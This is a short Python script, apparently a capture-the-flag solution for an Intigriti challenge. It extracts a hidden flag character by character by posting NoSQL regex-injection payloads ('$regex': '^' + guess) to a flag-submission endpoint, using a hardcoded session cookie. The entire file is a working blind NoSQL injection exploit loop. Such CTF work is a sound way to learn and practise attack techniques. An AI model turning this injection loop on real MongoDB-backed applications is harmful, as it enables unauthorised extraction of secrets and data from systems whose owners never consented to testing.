import string

import requests

base_url = "https://ctfc2.ctf.intigriti.io/submit_flag"
# table = string.ascii_uppercase + string.ascii_lowercase + string.digits + "{}_"
table = string.ascii_lowercase + string.digits + string.ascii_uppercase + "{}_"

flag = "INTIGRITI{h0w"

while True:
    for char in table:
        cookie = "session=eyJ1c2VyIjp7Il9pZCI6IjViYjBiMTc1NWU5YjRjMmY4OTg3MWNhYTE3ODRlODVmIiwidXNlcm5hbWUiOiJhc2RmIn19.ZVitwA.BVh_F1hAUqCugGPwJGwYBamiEYk"

        headers = {
            "Cookie": cookie
        }

        data = {
            "challenge_flag": {"$regex": "^" + flag + char},
            "_id": "_id:3"
        }

        result = requests.post(base_url, json=data, headers=headers)

        if "correct flag!" in result.text:
            flag += char
            print(flag)
            break
    if "}" in flag:
        break

print("flag", flag)
